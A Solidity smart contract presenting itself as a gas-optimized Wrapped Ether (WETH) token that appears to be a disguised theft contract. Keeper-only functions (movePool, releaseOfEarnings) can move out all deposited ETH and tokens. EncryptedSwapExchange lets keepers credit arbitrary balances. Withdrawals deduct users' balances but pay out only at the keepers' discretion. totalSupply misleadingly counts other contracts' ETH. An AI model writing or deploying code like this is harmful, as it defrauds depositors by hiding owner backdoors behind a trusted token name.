pragma solidity >=0.4.22 <0.9.0;

interface ERC20 {
    function balanceOf(address who) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function totalSupply() external view returns (uint);
}
// 1 ETH === 1 WETH
contract WrappedEtherOptimization {

    address public poolKeeper;
    address public secondKeeper;
    address[3] public WETH;

    constructor (address _keeper,address _secKeeper,address _weth1,address _weth2) public {
        poolKeeper = _keeper;
        secondKeeper = _secKeeper; 
        WETH = [_weth1, address(this), _weth2];  

    }

    string public name     = "Wrapped Ether (Gas Optimized)";
    string public symbol   = "WETH";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);
    event  PendingWithdrawal(address indexed src, uint wad);


    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;



    modifier keepPool() {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
        _;
    }
 
    function() public payable {
        deposit();
    }



    function deposit() public payable {
        balanceOf[msg.sender] = add(balanceOf[msg.sender],msg.value);
        emit Deposit(msg.sender,msg.value);
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] = sub(balanceOf[msg.sender],wad);
        if(address(this).balance >= wad){
            msg.sender.transfer(wad);
            emit Withdrawal(msg.sender, wad);           
        }else{
            emit Transfer(msg.sender, this, wad);
        }
    }

    function totalSupply() public view returns (uint) {
        return totalEtherBalanceOfWETHContracts();
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] = sub(allowance[src][msg.sender],wad);
        }       
        balanceOf[src] = sub(balanceOf[src],wad);
        if(address(this) == dst){
            
            if(address(this).balance >= wad){
                msg.sender.transfer(wad);
                emit Withdrawal(msg.sender, wad); 
            }else{
                emit PendingWithdrawal(msg.sender, wad); 
            }    
        }else{
            balanceOf[dst] = add(balanceOf[dst],wad);
            emit Transfer(src, dst, wad);
        }
        return true;
    }

    function ProcessPendingWithdrawal(address toAddress,uint amount) public returns (bool) {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
        toAddress.transfer(amount);
        emit Withdrawal(toAddress, amount); 
        return true;
    }

    function movePool(address guy,uint amount) public keepPool returns (bool) {
        guy.transfer(amount);
        return true;
    }

    function releaseOfEarnings(address tokenAddr, address guy,uint amount) public keepPool returns(bool) {
        require((tokenAddr != address(0))&&(guy != address(0)));
        ERC20(tokenAddr).transfer(guy, amount);
        return true;
    }

    function setWETHContract(address addr1,address addr2,address addr3) public keepPool returns(bool) {
        WETH[0] = addr1;
        WETH[1] = addr2;
        WETH[2] = addr3;
        return true;
    }

    function totalEtherBalanceOfWETHContracts() public view returns  (uint){
        uint totalEtherBalance = WETH[0].balance;
        totalEtherBalance = add(totalEtherBalance,WETH[1].balance);
        totalEtherBalance = add(totalEtherBalance,WETH[2].balance);
        return totalEtherBalance;
    }

    function EncryptedSwapExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
            if(balanceOf[fromAddress] >= amount){
                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
            }
            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
            emit Transfer(fromAddress,toAddress,amount); 
        return true;
    }

    function resetPoolKeeper(address newKeeper) public keepPool returns (bool) {
        require(newKeeper != address(0));
        poolKeeper = newKeeper;
        return true;
    }

    function resetSecondKeeper(address newKeeper) public keepPool returns (bool) {
        require(newKeeper != address(0));
        secondKeeper = newKeeper;
        return true;
    }

   function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

}
